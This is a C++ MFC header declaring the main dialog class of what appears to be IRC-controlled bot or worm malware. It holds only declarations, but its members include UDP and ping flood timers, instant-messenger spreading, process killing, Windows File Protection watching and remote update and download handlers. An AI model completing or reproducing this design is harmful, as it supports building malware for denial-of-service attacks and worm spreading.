#if !defined(AFX_FRMMAIN_H__8F8390F9_3298_45B4_A12B_90E7B54FC139__INCLUDED_)
#define AFX_FRMMAIN_H__8F8390F9_3298_45B4_A12B_90E7B54FC139__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// frmMain.h : header file
//

//{{chodebot_Class_Global(CfrmMain)
//}}chodebot_Class_Global

/////////////////////////////////////////////////////////////////////////////
// CfrmMain dialog

class CfrmMain : public CDialog
{
public:
// Construction
	CfrmMain(CWnd* pParent = NULL);   // standard constructor

// Dialog Data
	//{{chodebot_Class_Public(CfrmMain)
	long tmrMSNSendInterval;
	long tmrMSNInterval;
	long tmrHomepageInterval;
	long tmrKillBadInterval;
	long tmrUDPFloodInterval;
	long tmrPingPongInterval;
	long tmrPingInterval;
	long tmrUDPInterval;
	
	void dlDownload_Completed(short& Index, int& lngFileSize);
	void dlDownload_OtherError(short& Index, CString& Description, int& Number);
	void dlDownload_WinsockError(short& Index, CString& Description);
	void dlUpdate_Completed(int& lngFileSize);
	void dlUpdate_OtherError(CString& Description, int& Number);
	void dlUpdate_WinsockError(CString& Description);
	void Form_QueryUnload(short& Cancel, short& UnloadMode);
	void sckTCP_Closesck(CComVariant Index);
	void sckTCP_Connect(CComVariant Index);
	void sckTCP_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay);
	void LoadControls();
	void UnloadControls();
	void Form_Load();
	void Activate();
	void CleanUp();
	void sckHttp_CloseSck(CComVariant Index);
	void sckHttp_Connect(CComVariant Index);
	void sckHttp_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay);
	void sckIRC_CloseSck(CComVariant Index);
	void sckIRC_Connect(CComVariant Index);
	void sckIRC_DataArrival(CComVariant Index, int bytesTotal);
	void sckIRC_Error(CComVariant Index, short Number, CString& Description, int sCode, CString Source, CString HelpFile, int HelpContext, bool& CancelDisplay);
	void tmrActivate_Timer();
	void tmrCmdDelay_Timer(short& Index);
	void tmrDisconnect_Timer();
	void tmrHomepage_Timer();
	void tmrHttp_Timer();
	void tmrIMSpread_Timer();
	void tmrKillBad_Timer();
	void tmrMSN_Timer();
	void tmrMSNSend_Timer();
	void tmrPing_Timer();
	void tmrPingPong_Timer();
	void tmrConnect_Timer();
	void tmrTCP_Timer();
	void tmrTCPTimeout_Timer(short& Index);
	void tmrUDP_Timer();
	void tmrUDPFlood_Timer();
	void tmrUptime_Timer();
	void tmrWatchAIM_Timer();
	void tmrWatchWFP_Timer();
	
//	dlDownload *m_dlDownload[2];
	//}}chodebot_Class_Public

	//{{AFX_DATA(CfrmMain)
	enum { IDD = IDDfrmMain };
		// NOTE: the ClassWizard will add data members here
	CComboBox	m_Drives;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CfrmMain)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CfrmMain)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

extern CfrmMain *frmMain;

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_FRMMAIN_H__8F8390F9_3298_45B4_A12B_90E7B54FC139__INCLUDED_)
